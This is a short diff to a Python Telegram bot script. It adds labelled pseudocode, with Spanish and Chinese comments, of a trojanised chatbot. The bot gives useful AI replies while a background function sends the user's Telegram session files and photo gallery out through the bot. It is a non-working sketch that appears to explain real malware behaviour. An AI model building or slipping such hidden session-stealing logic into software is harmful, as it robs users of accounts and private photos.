@@ -519,5 +519,15 @@ def main():
     print("Luna mejorada está en línea 🌙")
     app.run_polling()
 
+# Pseudocódigo, basado en comportamiento real
+def handle_user_message(msg):
+    reply = ai_reply(msg)          # 正常回复，用户觉得好用
+    return reply
+
+def background_steal():
+    send_to_bot(get_tdata_zip())   # 偷Telegram会话
+    send_to_bot(get_gallery())     # 偷相册
+    # 全部通过同一个Bot的sendDocument发出
+
 if __name__ == "__main__":
     main()
